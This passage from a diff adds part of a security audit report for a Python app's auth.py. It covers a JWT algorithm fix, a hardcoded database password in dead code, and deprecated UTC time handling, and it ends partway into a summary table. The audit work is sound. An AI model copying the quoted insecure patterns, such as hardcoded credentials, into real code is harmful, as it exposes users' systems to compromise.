+**Fix:** Always specify the algorithm explicitly when decoding:
+```python
+jwt.decode(token, secret, algorithms=["HS256"])  # Never omit algorithms=
+```
+
+---
+
+### 17. Sensitive Data Exposure via `get_db_connection()`
+**File:** `./app/routes/auth.py`
+**Severity:** Low
+
+```python
+def get_db_connection():
+    db_password = "supersecretdbpassword123"
+    return db_password
+```
+
+This function serves no purpose other than returning a hardcoded credential string. It is dead code that increases the attack surface.
+
+**Fix:** Delete the function entirely and source credentials from environment variables as described in finding #5.
+
+---
+
+### 18. `datetime.utcnow()` Deprecation
+**File:** `./app/routes/auth.py`
+**Severity:** Low
+
+```python
+"exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
+```
+
+`datetime.utcnow()` is deprecated in Python 3.12+ and returns a naive datetime, which can cause subtle timezone-related bugs in token expiry validation.
+
+**Fix:**
+```python
+from datetime import datetime, timezone, timedelta
+"exp": datetime.now(tz=timezone.utc) + timedelta(hours=24)
+```
+
+---
+
+## Summary Table
+
+| # | File | Issue | Severity |
+|---|------|-------|----------|
+| 1 | `auth.py` | SQL Injection
